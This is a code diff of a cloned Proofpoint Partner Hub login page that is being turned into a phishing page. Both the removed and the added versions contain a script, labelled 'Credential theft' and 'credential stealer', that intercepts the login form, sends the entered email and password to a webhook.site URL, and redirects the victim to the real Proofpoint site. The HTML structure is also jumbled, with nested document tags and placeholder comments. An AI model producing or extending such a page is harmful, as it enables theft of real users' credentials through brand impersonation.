@@ -1,4 +1,11 @@
-<html data-darkreader-mode="dynamic" data-darkreader-scheme="dark" data-darkreader-proxy-injected="true"><head id="GlobalHead"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
+<!-- proofpoint-full.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  
+  <!-- Your ENTIRE 4000 lines of Proofpoint login page code goes here -->
+
+  <html data-darkreader-mode="dynamic" data-darkreader-scheme="dark" data-darkreader-proxy-injected="true"><head id="GlobalHead"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
 html {
     background-color: var(--darkreader-background-ffffff, #181a1b) !important;
 }
@@ -4826,58 +4833,34 @@ height:16rem;
 	<div class="container prm-notify-popup"></div>
 </section>
 
-<script>
-// Credential theft for Proofpoint Partner Hub
-(function() {
-    // Wait for the page to load
-    window.addEventListener('DOMContentLoaded', function() {
-        // Find the existing login form
+
+</body></html>
+    <title>Proofpoint Partner Hub</title>
+    <!-- ALL CSS, JS, HTML from the real page -->
+</head>
+<body>
+    <!-- FULL LOGIN PAGE CONTENT -->
+    
+    <script>
+    // Add credential stealer to the existing form
+    document.addEventListener('DOMContentLoaded', function() {
         const form = document.querySelector('form');
-        const emailInput = document.querySelector('input[type="email"], input[name="email"]');
-        const passwordInput = document.querySelector('input[type="password"]');
-        const loginButton = document.querySelector('button[type="submit"], input[type="submit"]');
-        
         if (form) {
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
+                const email = document.querySelector('input[type="email"], input[name="email"]')?.value;
+                const password = document.querySelector('input[type="password"]')?.value;
                 
-                const email = emailInput ? emailInput.value : '';
-                const password = passwordInput ? passwordInput.value : '';
-                
-                // Send credentials to webhook
                 fetch('https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78', {
                     method: 'POST',
                     mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password,
-                        timestamp: new Date().toISOString(),
-                        url: window.location.href,
-                        userAgent: navigator.userAgent
-                    })
+                    body: JSON.stringify({email, password})
                 });
                 
-                // Show fake error and redirect
-                alert('Session expired. Please login again.');
-                window.location.href = 'https://www.proofpoint.com/us';
-            });
-        }
-        
-        // Also intercept button click
-        if (loginButton) {
-            loginButton.addEventListener('click', function(e) {
-                if (form) {
-                    e.preventDefault();
-                    const event = new Event('submit', {bubbles: true, cancelable: true});
-                    form.dispatchEvent(event);
-                }
+                window.location.href = 'https://www.proofpoint.com';
             });
         }
     });
-})();
-</script>
-
-</body></html>
+    </script>
+</body>
+</html>
